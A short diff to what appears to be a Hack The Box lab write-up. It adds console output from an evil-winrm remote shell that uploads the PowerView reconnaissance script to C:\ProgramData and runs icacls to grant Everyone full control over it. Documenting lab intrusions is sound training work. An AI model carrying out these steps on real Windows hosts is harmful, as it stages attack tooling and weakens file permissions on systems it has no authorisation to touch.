@@ -559,9 +559,14 @@ evil-winrm-py PS C:\ProgramData> upload PowerView.ps1 .
 Uploading /home/kali/htb/logging/PowerView.ps1: 768kB [00:01, 532kB/s]                                       
 [+] File uploaded successfully as: C:\ProgramData\PowerView.ps1
 evil-winrm-py PS C:\ProgramData>
+
+evil-winrm-py PS C:\ProgramData> icacls "C:\ProgramData\PowerView.ps1" /grant Everyone:F
+processed file: C:\ProgramData\PowerView.ps1
+Successfully processed 1 files; Failed processing 0 files
+evil-winrm-py PS C:\ProgramData>
 ```
 
-Using my evil-winrm session ill upload powerview
+Using my evil-winrm session ill upload powerview, and grant everyone full control
 
 ```python
 
